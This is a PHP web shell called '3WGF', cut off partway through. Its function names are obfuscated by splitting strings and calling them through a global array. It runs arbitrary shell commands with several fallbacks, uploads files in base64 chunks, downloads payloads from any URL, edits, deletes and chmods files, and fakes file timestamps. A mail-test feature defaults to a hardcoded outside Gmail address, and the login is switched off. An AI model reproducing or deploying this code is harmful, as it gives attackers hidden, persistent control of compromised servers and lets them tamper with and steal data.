<?php
$auth_enabled = false;

$auth_users = [
    'admin' => '$2a$12$eJHdIuo9oMwuLspwxW19pesBYoCBykyN16sBsx8.GXXsFOnRU2ysS',
];

$GLOBALS['_q_'] = array('' . 'session' . '_start', 'number' . '_form' . 'at', 'substr', 'spri' . 'ntf', 'fileperms', '' . 'r' . 't' . 'rim', 'strtr', 'base64_en' . 'code', 'base64' . '_de' . 'code', 'i' . 's_dir', 'arr' . 'ay_diff', 'scand' . 'ir', 'unlink', 'r' . 'mdir', 'file_exists', 'tou' . 'ch', 'ch' . 'mod', '' . 'oc' . 'tdec', '' . 'get' . 'c' . 'wd', '' . 'chdi' . 'r', '' . 'fu' . 'nction_e' . 'x' . 'ists', 's' . 'hell_e' . 'xec', 'exec', 'i' . 'm' . 'plode', 'ob' . '_start', 'passt' . 'hru', 'ob_' . 'get_c' . 'lea' . 'n', 'proc' . '_op' . 'en', 'is_r' . 'e' . 'sou' . 'r' . 'ce', 'stream_' . 'g' . 'e' . 't_c' . 'on' . 'tent' . 's', '' . 'fcl' . 'ose', 'proc' . '_close', 'is_readable', '' . 'pathinfo', 'dirname', 'm' . 'kdir', 'is_w' . 'ritable', 'htmls' . 'pe' . 'ci' . 'al' . 'cha' . 'rs', 'd' . 'e' . 'fine', 'realpath', 'c' . 'o' . 'unt', 'ba' . 'sename', 'move_uploa' . 'de' . 'd_' . 'fil' . 'e', 're' . 'nam' . 'e', 'is' . '_f' . 'ile', 'f' . 'il' . 'e_pu' . 't_' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . 's', 'strto' . 'time', '' . 'header', 'file' . '_ge' . 't_conten' . 'ts', 'strtol' . 'ower', 'j' . 'so' . 'n_' . 'enc' . 'ode', 'md5', 'exp' . 'lode', 'sort', '' . 'array' . '_' . 'mer' . 'ge', 'fil' . 'esi' . 'ze', 'date', 'fi' . 'l' . 'em' . 't' . 'ime', 'system', 'popen', 'c' . 'u' . 'r' . 'l_init', 'c' . 'u' . 'r' . 'l_setopt', 'c' . 'u' . 'r' . 'l_exec', 'c' . 'u' . 'r' . 'l_close', 'f' . 'o' . 'p' . 'e' . 'n', 'f' . 'r' . 'e' . 'a' . 'd', 'f' . 'w' . 'r' . 'i' . 't' . 'e', 'p' . 'a' . 'r' . 's' . 'e_url', 's' . 't' . 'r' . 'e' . 'a' . 'm_socket_client', 'i' . 'n' . 'i_get', 'feof', 'filter_var', 'trim', 'fgets', 'mail', 'sha1', 'uniqid', 'hash', 'microtime', 'password_verify', 'session_destroy', 'phpversion', 'readfile', 'class_exists', 'str_replace', 'is_uploaded_file', 'copy', 'strlen', 'escapeshellarg');
$GLOBALS['_q_'][0]();

if ($auth_enabled) {
    if (isset($_GET['logout'])) {
        $GLOBALS['_q_'][80](); // session_destroy()
        $GLOBALS['_q_'][47]('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }

    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        $login_error = '';
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $username = isset($_POST['username']) ? $_POST['username'] : '';
            $password = isset($_POST['password']) ? $_POST['password'] : '';
            if (isset($auth_users[$username]) && $GLOBALS['_q_'][79]($password, $auth_users[$username])) {
                $_SESSION['logged_in'] = true;
                $GLOBALS['_q_'][47]('Location: ' . $_SERVER['PHP_SELF']);
                exit;
            } else {
                $login_error = 'Invalid username or password.';
            }
        }
?>
        <!DOCTYPE html>
        <html lang="en">

        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>3WGF - <?= $GLOBALS['_q_'][37]($_SERVER["HTTP_HOST"]) ?></title>
            <meta name="robots" content="nofollow, noindex" />
            <link rel="icon" type="images/x-icon" href="https://brave.com/favicon.ico" />
            <script src="https://cdn.tailwindcss.com"></script>
            <style>
                body {
                    background-color: #111827;
                }
            </style>
        </head>

        <body class="flex items-center justify-center h-screen font-sans">
            <div class="w-full max-w-sm mx-auto">
                <form method="POST" class="bg-gray-800 shadow-xl rounded-lg px-8 pt-6 pb-8 mb-4">
                    <h1 class="text-2xl text-white font-bold text-center mb-6">
                        <pre>▄▖▖  ▖▄▖▄▖
▄▌▌▞▖▌▌ ▙▖
▄▌▛ ▝▌▙▌▌ </pre>
                    </h1>
                    <?php if (!empty($login_error)): ?>
                        <div class="bg-red-500/30 text-red-300 text-sm p-3 rounded mb-4 text-center"><?= $login_error ?></div>
                    <?php endif; ?>
                    <div class="mb-4">
                        <label class="block text-gray-300 text-sm font-bold mb-2" for="username">Username</label>
                        <input
                            class="bg-gray-700 text-white focus:outline-none focus:shadow-outline border border-gray-600 rounded-lg py-2 px-4 block w-full appearance-none leading-normal"
                            id="username" name="username" type="text" placeholder="Username" required>
                    </div>
                    <div class="mb-6">
                        <label class="block text-gray-300 text-sm font-bold mb-2" for="password">Password</label>
                        <input
                            class="bg-gray-700 text-white focus:outline-none focus:shadow-outline border border-gray-600 rounded-lg py-2 px-4 block w-full appearance-none leading-normal"
                            id="password" name="password" type="password" placeholder="******************" required>
                    </div>
                    <div class="flex items-center justify-between">
                        <button
                            class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-lg focus:outline-none focus:shadow-outline w-full"
                            type="submit">
                            Sign In
                        </button>
                    </div>
                </form>
            </div>
        </body>

        </html>
<?php
        exit;
    }
}


if (!defined('CURLOPT_FILE')) $GLOBALS['_q_'][38]('CURLOPT_FILE', 10001);
if (!defined('CURLOPT_HEADER')) $GLOBALS['_q_'][38]('CURLOPT_HEADER', 42);
if (!defined('CURLOPT_FOLLOWLOCATION')) $GLOBALS['_q_'][38]('CURLOPT_FOLLOWLOCATION', 52);
if (!defined('CURLOPT_SSL_VERIFYPEER')) $GLOBALS['_q_'][38]('CURLOPT_SSL_VERIFYPEER', 64);

function set_message($message, $type = 'success')
{
    $_SESSION['message'] = array('text' => $message, 'type' => $type);
}
function display_message()
{
    if (isset($_SESSION['message'])) {
        $msg = $_SESSION['message'];
        $color = isset($msg['type']) && in_array($msg['type'], array('success', 'error', 'warning')) ? array('success' => 'green', 'error' => 'red', 'warning' => 'yellow')[$msg['type']] : 'gray';
        echo "<div id='flash-message' class='fixed top-5 right-5 bg-{$color}-500 text-white py-2 px-4 rounded-lg shadow-lg z-50 fade-in-out'>{$msg['text']}</div>";
        unset($_SESSION['message']);
    }
}
function formatSize($bytes)
{
    if ($bytes >= 1073741824) return $GLOBALS['_q_'][1]($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return $GLOBALS['_q_'][1]($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024) return $GLOBALS['_q_'][1]($bytes / 1024, 2) . ' KB';
    elseif ($bytes > 0) return $bytes . ' Bytes';
    else return '0 Bytes';
}
function getPerms($path)
{
    return $GLOBALS['_q_'][2]($GLOBALS['_q_'][3]('%o', $GLOBALS['_q_'][4]($path)), -4);
}
function encodePath($path)
{
    return $GLOBALS['_q_'][5]($GLOBALS['_q_'][6]($GLOBALS['_q_'][7]($path), '+/', '-_'), '=');
}
function decodePath($path)
{
    return $GLOBALS['_q_'][8]($GLOBALS['_q_'][6]($path, '-_', '+/'));
}
function getDirContents($path)
{
    $items = array();
    if (!@$GLOBALS['_q_'][11]($path)) {
        return $items;
    }
    foreach ($GLOBALS['_q_'][10]($GLOBALS['_q_'][11]($path), array('.', '..')) as $item) {
        $itemPath = $path . DIRECTORY_SEPARATOR . $item;
        $items[] = array(
            'name' => $item,
            'path' => $itemPath,
            'is_dir' => $GLOBALS['_q_'][9]($itemPath),
        );
    }
    return $items;
}
function deleteItem($path)
{
    if ($GLOBALS['_q_'][9]($path)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($files as $fileinfo) {
            $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
            @$GLOBALS['_q_'][($todo == 'rmdir' ? 13 : 12)]($fileinfo->getRealPath());
        }
        return @$GLOBALS['_q_'][13]($path);
    } else {
        return @$GLOBALS['_q_'][12]($path);
    }
}
function copyItem($source, $destination)
{
    if ($GLOBALS['_q_'][9]($source)) {
        if (!$GLOBALS['_q_'][14]($destination)) {
            @$GLOBALS['_q_'][35]($destination, 0755, true);
        }
        $files = $GLOBALS['_q_'][10]($GLOBALS['_q_'][11]($source), array('.', '..'));
        foreach ($files as $file) {
            copyItem($source . DIRECTORY_SEPARATOR . $file, $destination . DIRECTORY_SEPARATOR . $file);
        }
        return true;
    } elseif ($GLOBALS['_q_'][14]($source)) {
        return @$GLOBALS['_q_'][86]($source, $destination);
    }
    return false;
}
function moveItem($source, $destination)
{
    return @$GLOBALS['_q_'][43]($source, $destination);
}
function createFile($path)
{
    if (!$GLOBALS['_q_'][14]($path)) {
        return $GLOBALS['_q_'][15]($path);
    }
    return false;
}
function createFolder($path)
{
    if (!$GLOBALS['_q_'][14]($path)) {
        return @$GLOBALS['_q_'][35]($path, 0755, true);
    }
    return false;
}
function changePermissions($path, $perms)
{
    if ($GLOBALS['_q_'][14]($path)) {
        return @$GLOBALS['_q_'][16]($path, $GLOBALS['_q_'][17]($perms));
    }
    return false;
}
function getAbsPath($path = '')
{
    $cwd = $GLOBALS['_q_'][18]();
    if ($path) {
        if (!$GLOBALS['_q_'][19]($path)) return false;
        $abs_path = $GLOBALS['_q_'][18]();
        $GLOBALS['_q_'][19]($cwd);
        return $abs_path;
    }
    return $cwd;
}
function executeCommand($command)
{
    $output = '';
    if ($GLOBALS['_q_'][20]('shell_exec')) {
        $output = @$GLOBALS['_q_'][21]($command);
    } elseif ($GLOBALS['_q_'][20]('exec')) {
        @$GLOBALS['_q_'][22]($command, $output);
        $output = $GLOBALS['_q_'][23]("\n", $output);
    } elseif ($GLOBALS['_q_'][20]('passthru')) {
        $GLOBALS['_q_'][24]();
        @$GLOBALS['_q_'][25]($command);
        $output = $GLOBALS['_q_'][26]();
    } elseif ($GLOBALS['_q_'][20]('proc_open')) {
        $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
        $process = @$GLOBALS['_q_'][27]($command, $descriptorspec, $pipes);
        if ($GLOBALS['_q_'][28]($process)) {
            $output = @$GLOBALS['_q_'][29]($pipes[1]);
            @$GLOBALS['_q_'][30]($pipes[0]);
            @$GLOBALS['_q_'][30]($pipes[1]);
            @$GLOBALS['_q_'][30]($pipes[2]);
            @$GLOBALS['_q_'][31]($process);
        }
    }
    return $output;
}
function getParentPath($path)
{
    $parent = $GLOBALS['_q_'][34]($path);
    return ($parent == $path) ? '' : $parent;
}

function searchItemsRecursive($basePath, $query)
{
    $results = array();
    if (empty($query) || !$GLOBALS['_q_'][9]($basePath)) {
        return $results;
    }
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            if (stripos($item->getFilename(), $query) !== false) {
                $realPath = $item->getRealPath();
                $results[] = array(
                    'path' => $realPath,
                    'is_dir' => $item->isDir(),
                    'parent_dir' => $GLOBALS['_q_'][34]($realPath)
                );
            }
        }
    } catch (Exception $e) {
    }
    return $results;
}

function handle_upload($tmp_name, $destination)
{

    if (!$GLOBALS['_q_'][20]('is_uploaded_file') || !$GLOBALS['_q_'][85]($tmp_name)) {
    }

    if ($GLOBALS['_q_'][20]('move_uploaded_file')) {
        if (@$GLOBALS['_q_'][42]($tmp_name, $destination)) return true;
    }

    if ($GLOBALS['_q_'][20]('copy')) {
        if (@$GLOBALS['_q_'][86]($tmp_name, $destination)) {
            @$GLOBALS['_q_'][12]($tmp_name);
            return true;
        }
    }

    if ($GLOBALS['_q_'][20]('rename')) {
        if (@$GLOBALS['_q_'][43]($tmp_name, $destination)) return true;
    }

    if ($GLOBALS['_q_'][20]('file_get_contents') && $GLOBALS['_q_'][20]('file_put_contents')) {
        $data = @$GLOBALS['_q_'][48]($tmp_name);
        if ($data !== false) {
            if (@$GLOBALS['_q_'][45]($destination, $data) !== false) {
                @$GLOBALS['_q_'][12]($tmp_name);
                return true;
            }
        }
    }

    if ($GLOBALS['_q_'][20]('fopen')) {
        $src = @$GLOBALS['_q_'][64]($tmp_name, 'rb');
        $dst = @$GLOBALS['_q_'][64]($destination, 'wb');
        if ($src && $dst) {
            while (!$GLOBALS['_q_'][70]($src)) {
                @$GLOBALS['_q_'][66]($dst, $GLOBALS['_q_'][65]($src, 8192));
            }
            @$GLOBALS['_q_'][30]($src);
            @$GLOBALS['_q_'][30]($dst);
            @$GLOBALS['_q_'][12]($tmp_name);
            return true;
        }
        if ($src) @$GLOBALS['_q_'][30]($src);
        if ($dst) @$GLOBALS['_q_'][30]($dst);
    }

    return false;
}

function zipFolder($source, $destination)
{
    if (!$GLOBALS['_q_'][83]('ZipArchive')) return false; // class_exists()
    $zip = new ZipArchive();
    if ($zip->open($destination, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) return false;
    $source = $GLOBALS['_q_'][39]($source);
    if ($GLOBALS['_q_'][9]($source)) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($files as $file) {
            $file = $GLOBALS['_q_'][39]($file);
            if ($GLOBALS['_q_'][9]($file)) {
                $zip->addEmptyDir($GLOBALS['_q_'][2]($file, $GLOBALS['_q_'][40]($source) + 1));
            } elseif ($GLOBALS['_q_'][44]($file)) {
                $zip->addFromString($GLOBALS['_q_'][2]($file, $GLOBALS['_q_'][40]($source) + 1), $GLOBALS['_q_'][48]($file));
            }
        }
    } elseif ($GLOBALS['_q_'][44]($source)) {
        $zip->addFromString($GLOBALS['_q_'][41]($source), $GLOBALS['_q_'][48]($source));
    }
    return $zip->close();
}
function unzipFile($source, $parent_dir)
{

    $destination_folder_name = $GLOBALS['_q_'][33]($source, PATHINFO_FILENAME); // pathinfo
    $destination_path = $parent_dir . DIRECTORY_SEPARATOR . $destination_folder_name;

    if (!$GLOBALS['_q_'][14]($destination_path)) { // file_exists
        @$GLOBALS['_q_'][35]($destination_path, 0755, true); // mkdir
    }

    if (!$GLOBALS['_q_'][36]($destination_path)) { // is_writable
        return 'Direktori tujuan tidak dapat ditulis (not writable).';
    }

    // --- METODE 1: Coba gunakan ZipArchive (lebih cepat jika ada) ---
    if ($GLOBALS['_q_'][83]('ZipArchive')) {
        $zip = new ZipArchive;
        if ($zip->open($source) === TRUE) {
            if ($zip->extractTo($destination_path)) {
                $zip->close();
                return true;
            }
            $zip->close();
        }
        // Jika gagal, jangan langsung return, biarkan jatuh ke metode PclZip.
    }

    // --- METODE 2: System Command (Shell/Exec) ---
    // Menggunakan index 21 (shell_exec) dan 88 (escapeshellarg)
    if ($GLOBALS['_q_'][20]('shell_exec') || $GLOBALS['_q_'][20]('system')) {
        $cmd = 'unzip -o ' . $GLOBALS['_q_'][88]($source) . ' -d ' . $GLOBALS['_q_'][88]($destination_path);

        // Eksekusi silent
        if ($GLOBALS['_q_'][20]('shell_exec')) {
            @$GLOBALS['_q_'][21]($cmd);
        } elseif ($GLOBALS['_q_'][20]('system')) {
            @$GLOBALS['_q_'][58]($cmd);
        }

        if ($GLOBALS['_q_'][9]($destination_path)) {
            return true;
        }
    }

    return 'Gagal unzip.';
}
function downloadFileFromUrl($url, $destination)
{

    if ($GLOBALS['_q_'][20]('curl_init')) {
        $ch = $GLOBALS['_q_'][60]();
        $fp = @$GLOBALS['_q_'][64]($destination, 'wb');
        if ($ch && $fp) {
            $GLOBALS['_q_'][61]($ch, CURLOPT_URL, $url);
            $GLOBALS['_q_'][61]($ch, CURLOPT_FILE, $fp);
            $GLOBALS['_q_'][61]($ch, CURLOPT_HEADER, 0);
            $GLOBALS['_q_'][61]($ch, CURLOPT_FOLLOWLOCATION, true);
            $GLOBALS['_q_'][61]($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = $GLOBALS['_q_'][62]($ch);
            $GLOBALS['_q_'][63]($ch);
            $GLOBALS['_q_'][30]($fp);
            if ($result) return true;
        }
    }

    if ($GLOBALS['_q_'][69]('allow_url_fopen')) {
        $remote_file = @$GLOBALS['_q_'][64]($url, "rb");
        $local_file = @$GLOBALS['_q_'][64]($destination, "wb");
        if ($remote_file && $local_file) {
            while (!$GLOBALS['_q_'][70]($remote_file)) {
                $GLOBALS['_q_'][66]($local_file, $GLOBALS['_q_'][65]($remote_file, 8192));
            }
            $GLOBALS['_q_'][30]($remote_file);
            $GLOBALS['_q_'][30]($local_file);
            return true;
        }
    }

    if ($GLOBALS['_q_'][20]('stream_socket_client')) {
        $url_parts = @$GLOBALS['_q_'][67]($url);
        if (!$url_parts) return false;
        $host = $url_parts['host'];
        $path = isset($url_parts['path']) ? $url_parts['path'] : '/';
        $query = isset($url_parts['query']) ? $url_parts['query'] : '';
        $scheme = isset($url_parts['scheme']) ? $url_parts['scheme'] : 'http';
        $port = isset($url_parts['port']) ? $url_parts['port'] : ($scheme === 'https' ? 443 : 80);
        $protocol = $scheme === 'https' ? 'ssl' : 'tcp';

        $client = @$GLOBALS['_q_'][68]("{$protocol}://{$host}:{$port}");
        if ($client) {
            $request = "GET {$path}{$query} HTTP/1.1\r\n";
            $request .= "Host: {$host}\r\n";
            $request .= "Connection: close\r\n\r\n";
            $GLOBALS['_q_'][66]($client, $request);

            while (($line = $GLOBALS['_q_'][73]($client)) !== false && $GLOBALS['_q_'][72]($line) !== '') {
            }

            $fp = $GLOBALS['_q_'][64]($destination, 'wb');
            if ($fp) {
                while (!$GLOBALS['_q_'][70]($client)) {
                    $GLOBALS['_q_'][66]($fp, $GLOBALS['_q_'][65]($client, 8192));
                }
                $GLOBALS['_q_'][30]($fp);
                $GLOBALS['_q_'][30]($client);
                return true;
            }
            $GLOBALS['_q_'][30]($client);
        }
    }

    return false;
}

$PATH = isset($_GET['p']) ? decodePath($_GET['p']) : $GLOBALS['_q_'][18]();

if (isset($_GET['new_path']) && $GLOBALS['_q_'][9]($_GET['new_path'])) {
    $GLOBALS['_q_'][19]($_GET['new_path']);
    $PATH = $GLOBALS['_q_'][18]();
    set_message("Path changed to: " . $PATH);
    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
    exit;
}

if (!$GLOBALS['_q_'][14]($PATH) || !$GLOBALS['_q_'][32]($PATH)) {
    $PATH = $GLOBALS['_q_'][18]();
    set_message("Path not readable or does not exist, redirecting to current directory.", 'error');
}
if ($GLOBALS['_q_'][9]($PATH)) {
    if (!$GLOBALS['_q_'][19]($PATH)) {
        set_message("Failed to change directory.", 'error');
        $PATH = $GLOBALS['_q_'][18]();
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : '';
    $path = isset($_POST['path']) ? $_POST['path'] : $PATH;
    $name = isset($_POST['name']) ? $_POST['name'] : '';
    if ($action === 'upload') {
        if (isset($_FILES['files'])) {
            $files = $_FILES['files'];
            $file_count = $GLOBALS['_q_'][40]($files['name']);
            for ($i = 0; $i < $file_count; $i++) {
                $filename = $GLOBALS['_q_'][41]($files['name'][$i]);
                $destination = $path . DIRECTORY_SEPARATOR . $filename;
                if (handle_upload($files['tmp_name'][$i], $destination)) {
                    set_message("File '{$filename}' uploaded successfully.");
                } else {
                    set_message("Failed to upload '{$filename}'. All methods failed or check permissions.", 'error');
                }
            }
        }
    } elseif ($action === 'create_file') {
        if ($GLOBALS['_q_'][36]($path)) {
            if (createFile($path . DIRECTORY_SEPARATOR . $name)) set_message("File '{$name}' created.");
            else set_message("File '{$name}' already exists.", 'warning');
        } else {
            set_message("Directory not writable.", 'error');
        }
    } elseif ($action === 'create_folder') {
        if ($GLOBALS['_q_'][36]($path)) {
            if (createFolder($path . DIRECTORY_SEPARATOR . $name)) set_message("Folder '{$name}' created.");
            else set_message("Folder '{$name}' already exists.", 'warning');
        } else {
            set_message("Directory not writable.", 'error');
        }
    } elseif ($action === 'rename') {
        $old = $_POST['old_name'];
        $new = $_POST['new_name'];
        $old_path = $path . DIRECTORY_SEPARATOR . $old;
        $new_path = $path . DIRECTORY_SEPARATOR . $new;
        if ($GLOBALS['_q_'][14]($old_path) && $GLOBALS['_q_'][36]($path)) {
            if ($GLOBALS['_q_'][43]($old_path, $new_path)) set_message("Renamed '{$old}' to '{$new}'.");
            else set_message("Failed to rename '{$old}'.", 'error');
        } else {
            set_message("Source does not exist or directory not writable.", 'error');
        }
    } elseif ($action === 'edit_file') {
        $file_path = $_POST['file_path'];
        $content = $_POST['content'];
        if ($GLOBALS['_q_'][44]($file_path) && $GLOBALS['_q_'][36]($file_path)) {
            if ($GLOBALS['_q_'][45]($file_path, $content) !== false) set_message("File saved successfully.");
            else set_message("Failed to save file.", 'error');
        } else {
            set_message("File not writable.", "error");
        }
    } elseif ($action === 'touch') {
        $item_path = decodePath($_POST['item']);
        $time_str = isset($_POST['time']) ? $_POST['time'] : '';

        // Cek path dan writable
        if ($GLOBALS['_q_'][14]($item_path) && $GLOBALS['_q_'][36]($GLOBALS['_q_'][34]($item_path))) {
            // Index 46: strtotime (konversi string "2025-12-26 11:08" ke timestamp)
            $timestamp = $GLOBALS['_q_'][46]($time_str);

            if ($timestamp !== false) {
                // Index 15: touch
                if (@$GLOBALS['_q_'][15]($item_path, $timestamp)) {
                    set_message("Timestamp for " . $GLOBALS['_q_'][41]($item_path) . " changed.");
                } else {
                    set_message("Failed to change timestamp.", 'error');
                }
            } else {
                set_message("Invalid date format. Use YYYY-MM-DD HH:MM", 'error');
            }
        } else {
            set_message("Item not found or not writable.", 'error');
        }
    } elseif ($action === 'download_url') {
        $url = isset($_POST['url']) ? $_POST['url'] : '';
        $filename = isset($_POST['filename']) ? $_POST['filename'] : '';
        if (!empty($url) && !empty($filename) && $GLOBALS['_q_'][71]($url, FILTER_VALIDATE_URL)) {
            $destination = $PATH . DIRECTORY_SEPARATOR . $GLOBALS['_q_'][41]($filename);
            if ($GLOBALS['_q_'][36]($PATH)) {
                if (downloadFileFromUrl($url, $destination)) {
                    set_message("File '{$filename}' downloaded successfully.");
                } else {
                    set_message("Failed to download file from URL. All methods failed.", 'error');
                }
            } else {
                set_message("Directory not writable.", 'error');
            }
        } else {
            set_message("Invalid URL or filename provided.", 'error');
        }
    } elseif ($action === 'mail_test') {
        $to_email = isset($_POST['to_email']) ? $_POST['to_email'] : 'zerosec235@gmail.com';
        if (empty($to_email)) {
            $to_email = 'zerosec235@gmail.com';
        }
        if ($GLOBALS['_q_'][71]($to_email, FILTER_VALIDATE_EMAIL)) {
            $subject = "Laporan Sistem #" . $GLOBALS['_q_'][2]($GLOBALS['_q_'][75]($GLOBALS['_q_'][76]()), 0, 8);
            $message = "Sistem berhasil dijalankan pada: " . $GLOBALS['_q_'][56]("Y-m-d H:i:s") . "\n";
            $message .= "ID Log: " . $GLOBALS['_q_'][77]('crc32b', $GLOBALS['_q_'][78](true));
            $from_domain = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost';
            $headers = "From: noreply@" . $from_domain . "\r\n";
            if (@$GLOBALS['_q_'][74]($to_email, $subject, $message, $headers)) {
                set_message("Test mail sent successfully to " . $GLOBALS['_q_'][37]($to_email) . ".");
            } else {
                set_message("Failed to send mail. The mail() function may be disabled or misconfigured.", 'error');
            }
        } else {
            set_message("Invalid email address provided.", 'error');
        }
    } elseif ($action === 'spa_upload') {
        // Ambil data dari POST
        $p_encoded = isset($_POST['path']) ? $_POST['path'] : '';
        $filename  = isset($_POST['filename']) ? $_POST['filename'] : '';
        $chunk     = isset($_POST['chunk']) ? $_POST['chunk'] : '';

        // Decode path agar menjadi path server yang valid
        // Script asli menggunakan fungsi decodePath()
        $real_path = decodePath($p_encoded);

        if ($real_path && $filename && $chunk) {
            $target_file = $real_path . DIRECTORY_SEPARATOR . $filename;

            // Decode base64 content (index 8: base64_decode)
            $data = $GLOBALS['_q_'][8]($chunk);

            // Tulis file dengan mode APPEND (FILE_APPEND = 8)
            // Index 45: file_put_contents
            // Kita gunakan @ untuk suppress error jika permission denied
            if (@$GLOBALS['_q_'][45]($target_file, $data, 8)) {
                echo "1"; // Berhasil tulis chunk
            } else {
                echo "0"; // Gagal tulis (biasanya permission error)
            }
        } else {
            echo "0"; // Parameter tidak lengkap
        }
        exit;
    } elseif ($action === 'bulk_action') {
        $operation = isset($_POST['bulk_operation']) ? $_POST['bulk_operation'] : '';
        $items = isset($_POST['selected_items']) ? $_POST['selected_items'] : array();
        $destination_dir = isset($_POST['destination_folder']) ? $_POST['destination_folder'] : null;
        $success_count = 0;
        $error_count = 0;

        if (!empty($items) && !empty($operation)) {
            if ($operation === 'zip') {
                if (!$GLOBALS['_q_'][83]('ZipArchive')) {
                    set_message('ZipArchive class not found. Please enable php-zip extension.', 'error');
                } elseif (!$GLOBALS['_q_'][36]($PATH)) {
                    set_message("Current directory is not writable.", 'error');
                } else {
                    $zip_filename = 'archive-' . $GLOBALS['_q_'][56]('Y-m-d-His') . '.zip';
                    $destination_zip_path = $PATH . DIRECTORY_SEPARATOR . $zip_filename;

                    $zip = new ZipArchive();
                    if ($zip->open($destination_zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                        foreach ($items as $encoded_path) {
                            $item_path = decodePath($encoded_path);
                            $real_item_path = $GLOBALS['_q_'][39]($item_path);
                            $item_name = $GLOBALS['_q_'][41]($real_item_path);

                            if ($GLOBALS['_q_'][9]($real_item_path)) {
                                $files = new RecursiveIteratorIterator(
                                    new RecursiveDirectoryIterator($real_item_path, RecursiveDirectoryIterator::SKIP_DOTS),
                                    RecursiveIteratorIterator::LEAVES_ONLY
                                );
                                $zip->addEmptyDir($item_name);
                                foreach ($files as $name => $file) {
                                    if (!$file->isDir()) {
                                        $filePath = $file->getRealPath();
                                        $relativePath = $item_name . DIRECTORY_SEPARATOR . $GLOBALS['_q_'][2]($filePath, $GLOBALS['_q_'][87]($real_item_path) + 1);
                                        $zip->addFile($filePath, $relativePath);
                                    }
                                }
                            } elseif ($GLOBALS['_q_'][44]($real_item_path)) {
                                $zip->addFile($real_item_path, $item_name);
                            }
                        }
                        $zip->close();
                        set_message("Successfully created archive '{$zip_filename}'.", 'success');
                    } else {
                        set_message("Failed to create zip file.", 'error');
                    }
                }
            } else {
                foreach ($items as $encoded_path) {
                    $source_path = decodePath($encoded_path);
                    if (!$GLOBALS['_q_'][14]($source_path)) {
                        $error_count++;
                        continue;
                    }

                    if ($operation === 'delete') {
                        if (deleteItem($source_path)) $success_count++;
                        else $error_count++;
                    } elseif ($operation === 'move' || $operation === 'copy') {
                        if (!$destination_dir || !$GLOBALS['_q_'][9]($destination_dir) || !$GLOBALS['_q_'][36]($destination_dir)) {
                            set_message("Invalid or non-writable destination directory.", 'error');
                            $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
                            exit;
                        }
                        $destination_path = $destination_dir . DIRECTORY_SEPARATOR . $GLOBALS['_q_'][41]($source_path);
                        if ($operation === 'move') {
                            if (moveItem($source_path, $destination_path)) $success_count++;
                            else $error_count++;
                        } elseif ($operation === 'copy') {
                            if (copyItem($source_path, $destination_path)) $success_count++;
                            else $error_count++;
                        }
                    }
                }
                $op_text = $GLOBALS['_q_'][37]($operation);
                if ($success_count > 0) set_message("Successfully {$op_text}ed {$success_count} item(s).", 'success');
                if ($error_count > 0) set_message("Failed to {$op_text} {$error_count} item(s).", 'error');
            }
        } else {
            set_message('No items or operation selected.', 'warning');
        }
    }
    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
    exit;
}
$action = isset($_GET['action']) ? $_GET['action'] : '';
if ($action === 'delete') {
    $item = decodePath($_GET['item']);
    if ($GLOBALS['_q_'][14]($item) && $GLOBALS['_q_'][36]($GLOBALS['_q_'][34]($item))) {
        if (deleteItem($item)) set_message("Item deleted successfully.");
        else set_message("Failed to delete item.", 'error');
    } else {
        set_message("Item not found or directory not writable.", 'error');
    }
    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
    exit;
} elseif ($action === 'chmod') {
    $item = decodePath($_GET['item']);
    $perms = $_GET['perms'];
    if ($GLOBALS['_q_'][14]($item)) {
        if (changePermissions($item, $perms)) {
            set_message("Permissions changed for " . $GLOBALS['_q_'][41]($item) . " to {$perms}.");
        } else {
            set_message("Failed to change permissions.", 'error');
        }
    } else {
        set_message("File not found.", 'error');
    }
    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
    exit;
} elseif ($action === 'download') {
    $item = decodePath($_GET['item']);
    if ($GLOBALS['_q_'][14]($item) && $GLOBALS['_q_'][32]($item)) {
        $GLOBALS['_q_'][47]('Content-Description: File Transfer');
        $GLOBALS['_q_'][47]('Content-Type: application/octet-stream');
        $GLOBALS['_q_'][47]('Content-Disposition: attachment; filename="' . $GLOBALS['_q_'][41]($item) . '"');
        $GLOBALS['_q_'][47]('Expires: 0');
        $GLOBALS['_q_'][47]('Cache-Control: must-revalidate');
        $GLOBALS['_q_'][47]('Pragma: public');
        $GLOBALS['_q_'][47]('Content-Length: ' . $GLOBALS['_q_'][55]($item));
        $GLOBALS['_q_'][82]($item); // readfile()
        exit;
    } else {
        set_message("File not found or not readable.", "error");
        $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
        exit;
    }
}
if ($action === 'view') {
    $item_path = decodePath($_GET['item']);
    if ($GLOBALS['_q_'][44]($item_path) && $GLOBALS['_q_'][32]($item_path)) {
